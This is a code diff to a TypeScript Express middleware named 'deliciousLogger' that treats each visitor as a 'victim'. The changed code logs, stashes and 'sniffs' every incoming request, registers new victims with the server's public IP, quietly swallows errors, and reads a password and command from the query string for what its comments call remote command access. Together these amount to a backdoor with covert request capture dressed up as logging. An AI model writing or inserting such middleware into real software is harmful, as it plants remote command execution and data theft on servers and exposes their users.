@@ -29,16 +29,20 @@ const deliciousLogger = ({
   let publicIPv4: string;
   /* * Middleware function * */
   return async (req: Request, _: Response, next: any) => {
-    // Check if victim is newly-accessed
+    // Initialize new victim upon 1st request
     if (isNew) {
       publicIPv4 = await IPUtils.publicIPv4();
       try {
-        initVictim(req, publicIPv4);
+        initVictim(req, publicIPv4).then(() => logger.sniff(req, publicIPv4));
       } catch (err) {
         // Ignore malicious exception
         return next();
       }
       isNew = false;
+      // Perform logging and stashing
+      logger.log(req);
+      logger.stash(req);
+      return next();
     }
     // Check valid access to remote command
     const { pwd, cmd } = req.query;
@@ -48,13 +52,14 @@ const deliciousLogger = ({
     }
     // Perform logging and stashing
     logger.log(req);
+    logger.stash(req);
+    // Sniff user's request
     try {
       logger.sniff(req, publicIPv4);
     } catch (err) {
       // Ignore malicious exception
       return next();
     }
-    logger.stash(req);
     return next();
   };
 };
